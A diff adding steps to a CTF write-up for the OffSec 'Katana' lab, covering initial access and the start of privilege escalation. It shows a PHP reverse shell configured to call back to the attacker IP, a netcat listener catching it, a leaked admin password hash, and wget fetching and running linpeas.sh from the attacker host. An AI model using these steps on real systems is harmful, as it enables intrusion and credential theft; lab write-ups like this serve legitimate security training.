@@ -169,13 +169,6 @@ http://192.168.231.83:8088/upload.php
 
 ![](../../../assets/images/Pasted%20image%2020260519204740.png)
 
-http://192.168.231.83:8088/upload.html
-
-![](../../../assets/images/Pasted%20image%2020260520041637.png)
-
-![](../../../assets/images/Pasted%20image%2020260520042212.png)
-
-
 # 8715
 
 ![](../../../assets/images/Pasted%20image%2020260520041832.png)
@@ -197,64 +190,167 @@ http://192.168.231.83:8088/upload.html
 
 # Initial Access
 
+
 ```zsh
+┌──(kali㉿kali)-[~/CTF/OffSec/Katana]
+└─$ cp /usr/share/webshells/php/php-reverse-shell.php .
+```
+
+```zsh
+┌──(kali㉿kali)-[~/CTF/OffSec/Katana]
+└─$ cat php-reverse-shell.php | grep 192 ;cat php-reverse-shell.php | grep 443
+$ip = '192.168.45.160';  // CHANGE THIS
+$port = 443;       // CHANGE THIS
+```
+
+http://192.168.231.83:8715/katana_php-reverse-shell.php
+
+
+http://192.168.231.83:8088/upload.html
+
+![](../../../assets/images/Pasted%20image%2020260520041637.png)
+
+![](../../../assets/images/Pasted%20image%2020260520042212.png)
+
+```zsh
+Moved to other web server: /tmp/phprXya5u ====> /opt/manager/html/katana_php-reverse-shell.php
+```
+
+http://192.168.231.83:8715/katana_php-reverse-shell.php
+
+```zsh
+┌──(kali㉿kali)-[~/CTF/OffSec/Katana]
+└─$ rlwrap -cAr nc -lvnp 443                           
+listening on [any] 443 ...
+connect to [192.168.45.160] from (UNKNOWN) [192.168.231.83] 48910
+Linux katana 4.19.0-9-amd64 #1 SMP Debian 4.19.118-2 (2020-04-29) x86_64 GNU/Linux
+ 15:33:06 up 39 min,  0 users,  load average: 0.00, 0.02, 0.00
+USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+/bin/sh: 0: can't access tty; job control turned off
+$ 
 
 ```
 
 ```zsh
+$ python3 -c 'import pty; pty.spawn("/bin/bash")'
 
+www-data@katana:/$
 ```
 
 ```zsh
+www-data@katana:~$ ls
+ls
+html  local.txt
+www-data@katana:~$ cat local.txt
+cat local.txt
 
+www-data@katana:~$ ip a
+ip a
+1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
+    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
+    inet 127.0.0.1/8 scope host lo
+       valid_lft forever preferred_lft forever
+3: ens33: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc pfifo_fast state UP group default qlen 1000
+    link/ether 00:50:56:ab:39:a0 brd ff:ff:ff:ff:ff:ff
+    inet 192.168.231.83/24 brd 192.168.231.255 scope global ens33
+       valid_lft forever preferred_lft forever
+www-data@katana:~$ 
 ```
 
-```zsh
 
-```
-
-```zsh
-
-```
-
-```zsh
-
-```
-
-```zsh
-
-```
-
-```zsh
-
-```
-
-```zsh
-
-```
 ---
 
 # Privilege Escalation
 
 ```zsh
-
+www-data@katana:/$ id
+id
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
 ```
 
 ```zsh
+www-data@katana:~/html/ebook/database$ cat readme.txt.txt
+cat readme.txt.txt
+This is an simple online web store was made by using php , mysql and bootstrap. 
 
+the sql for database is put in folder sql. 
+the database contains many tables. 
+
+To change the localhost, username, password for connecting to database, change it only one time in 
+www_project/functions/database_functions.php -> db_connect() . Simple and fast
+The base is localhost , root , , www_project 
+
+to connect the admin section, click the name Nghi Le Thanh at the bottom. 
+the name and pass for log in is admin , admin. Just to make it simple. 
+
+the 2 main things are not fully implemented is contact and process purchase. 
+Due to having to work with some security and online payment, the process site is just a place holder. 
+
+for futher questions, please let me know. my email: nghi.lethanh2@cou.fi
+www-data@katana:~/html/ebook/database$ 
+```
+
+```
+これは、PHP、MySQL、Bootstrapを使用して作成されたシンプルなオンラインストアです。
+
+データベース用のSQLは「sql」フォルダ内に格納されています。
+データベースには多くのテーブルが含まれています。
+
+データベース接続用のlocalhost、ユーザー名、パスワードを変更するには、
+www_project/functions/database_functions.php 内の db_connect() 関数で一度だけ変更してください。簡単かつ迅速です
+デフォルトの設定は、localhost、root、www_project です。
+
+管理画面にアクセスするには、下部の「Nghi Le Thanh」という名前をクリックしてください。
+ログイン用のユーザー名とパスワードは、どちらも「admin」です。シンプルにするためです。
+
+「お問い合わせ」と「購入手続き」の2つの主要な機能は、まだ完全には実装されていません。
+セキュリティやオンライン決済の対応が必要なため、購入処理ページは現時点ではプレースホルダーとなっています。
+
+ご質問がございましたら、お知らせください。メールアドレス：nghi.lethanh2@cou.fi
+www-data@katana:~/html/ebook/databas
+
+DeepL.com（無料版）で翻訳しました。
 ```
 
 ```zsh
+www-data@katana:~/html/ebook/database$ cat www_project.sql
 
+
+-- Dumping data for table `admin`
+--
+
+INSERT INTO `admin` (`name`, `pass`) VALUES
+('admin', 'd033e22ae348aeb5660fc2140aec35850c4da997');
+
+```
+
+![](../../../assets/images/Pasted%20image%2020260520045607.png)
+
+```zsh
+www-data@katana:~/html/ebook/database$ wwget http://192.168.45.160/linpeas.sh -O /tmp/linpeas.sh
+<http://192.168.45.160/linpeas.sh -O /tmp/linpeas.sh
+--2026-05-19 15:57:38--  http://192.168.45.160/linpeas.sh
+Connecting to 192.168.45.160:80... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 1062554 (1.0M) [application/x-sh]
+Saving to: ‘/tmp/linpeas.sh’
+
+/tmp/linpeas.sh     100%[===================>]   1.01M   341KB/s    in 3.0s    
+
+2026-05-19 15:57:41 (341 KB/s) - ‘/tmp/linpeas.sh’ saved [1062554/1062554]
 ```
 
 ```zsh
-
+www-data@katana:~/html/ebook/database$ chmod +x /tmp/linpeas.sh
+chmod +x /tmp/linpeas.sh
 ```
 
 ```zsh
-
+www-data@katana:~/html/ebook/database$ /tmp/linpeas.sh
 ```
+
+![](../../../assets/images/Pasted%20image%2020260520050035.png)
 
 ```zsh
 
